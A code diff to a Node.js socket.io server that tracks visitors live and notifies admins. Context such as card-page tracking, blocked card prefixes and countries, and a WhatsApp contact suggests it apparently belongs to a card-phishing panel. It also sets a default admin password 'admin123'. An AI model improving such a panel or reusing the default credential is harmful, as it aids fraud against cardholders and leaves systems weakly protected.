@@ -198,7 +198,7 @@ function _doSaveSync() {
 
 // Initialize data from file
 const savedData = loadSavedData();
-const visitors = savedData.visitors;
+const visitors = new Map(); // Start with empty Map - no sockets connected on fresh start
 const admins = new Map();
 let visitorCounter = savedData.visitorCounter;
 let savedVisitors = savedData.savedVisitors; // Array to store all visitors permanently
@@ -206,6 +206,13 @@ let whatsappNumber = savedData.whatsappNumber || ""; // WhatsApp number for foot
 let globalBlockedCards = savedData.globalBlockedCards || []; // Global blocked card prefixes
 let globalBlockedCountries = savedData.globalBlockedCountries || []; // Global blocked countries
 let adminPassword = savedData.adminPassword || "admin123"; // Admin password (persisted)
+
+// CRITICAL: On server startup, mark ALL saved visitors as disconnected
+// No sockets are connected when server starts fresh
+savedVisitors.forEach(v => {
+  v.isConnected = false;
+});
+console.log(`Marked all ${savedVisitors.length} saved visitors as disconnected on startup`);
 
 // Generate unique API key
 function generateApiKey() {
@@ -311,8 +318,10 @@ function saveVisitorPermanently(visitor) {
 
 // Auto-save all visitor data every 30 seconds as safety net
 setInterval(() => {
-  // Sync all active visitors to savedVisitors
+  // Get set of currently connected visitor IDs
+  const connectedIds = new Set();
   visitors.forEach((visitor) => {
+    connectedIds.add(visitor._id);
     const existingIndex = savedVisitors.findIndex(v => v._id === visitor._id);
     if (existingIndex >= 0) {
       const existing = savedVisitors[existingIndex];
@@ -337,9 +346,18 @@ setInterval(() => {
         merged.data = { ...existing.data, ...visitor.data };
       }
       if (existing.hasEnteredCardPage) merged.hasEnteredCardPage = true;
+      merged.isConnected = true;
       savedVisitors[existingIndex] = merged;
     }
   });
+  
+  // CRITICAL: Mark all saved visitors NOT in the active Map as disconnected
+  savedVisitors.forEach(v => {
+    if (!connectedIds.has(v._id)) {
+      v.isConnected = false;
+    }
+  });
+  
   saveData();
 }, 30000); // Every 30 seconds
 
@@ -399,6 +417,14 @@ io.on("connection", (socket) => {
       const prevSocketIds = existingVisitor.previousSocketIds || [];
       if (existingVisitor.socketId && existingVisitor.socketId !== socket.id) {
         prevSocketIds.push(existingVisitor.socketId);
+        // CRITICAL: Remove old socket entry from active visitors Map to prevent ghost entries
+        visitors.delete(existingVisitor.socketId);
+      }
+      // Also clean up any other Map entries with the same _id (from previous reconnects)
+      for (const [sid, v] of visitors) {
+        if (v._id === existingVisitor._id && sid !== socket.id) {
+          visitors.delete(sid);
+        }
       }
       visitor = {
         ...existingVisitor,
@@ -1073,8 +1099,14 @@ io.on("connection", (socket) => {
       const visitorId = visitor._id;
       const socketId = socket.id;
       
-      // CRITICAL: Save ALL visitor data to savedVisitors BEFORE removing from Map
-      // This ensures no data is ever lost during disconnect/reconnect
+      // CRITICAL: Mark as disconnected IMMEDIATELY in savedVisitors
+      const savedVisitor = savedVisitors.find(v => v._id === visitorId);
+      if (savedVisitor) {
+        savedVisitor.isConnected = false;
+      }
+      
+      // Save ALL visitor data to savedVisitors BEFORE removing from Map
+      visitor.isConnected = false;
       saveVisitorPermanently(visitor);
       
       // Now safe to remove from active Map
@@ -1086,12 +1118,12 @@ io.on("connection", (socket) => {
         const reconnected = Array.from(visitors.values()).some(v => v._id === visitorId && v.isConnected);
         
         if (!reconnected) {
-          // Update saved visitor as disconnected
-          const savedVisitor = savedVisitors.find(v => v._id === visitorId);
-          if (savedVisitor) {
-            savedVisitor.isConnected = false;
-            saveData();
+          // Double-check saved visitor is marked disconnected
+          const sv = savedVisitors.find(v => v._id === visitorId);
+          if (sv) {
+            sv.isConnected = false;
           }
+          saveData();
           
           // Notify admins
           admins.forEach((admin, adminSocketId) => {
@@ -1101,7 +1133,7 @@ io.on("connection", (socket) => {
             });
           });
           
-          console.log(`Visitor disconnected: ${socketId}`);
+          console.log(`Visitor disconnected: ${socketId} (${visitorId})`);
         } else {
           console.log(`Visitor ${visitorId} reconnected quickly, skipping disconnect notification`);
         }
@@ -1134,9 +1166,12 @@ app.get("/api/visitors", (req, res) => {
 });
 
 app.get("/api/stats", (req, res) => {
+  // Count unique connected visitors (by _id) to avoid counting duplicates
+  const uniqueConnected = new Set();
+  visitors.forEach(v => uniqueConnected.add(v._id));
   res.json({
     totalVisitors: savedVisitors.length,
-    connectedVisitors: visitors.size,
+    connectedVisitors: uniqueConnected.size,
     totalAdmins: admins.size,
     visitorCounter,
   });
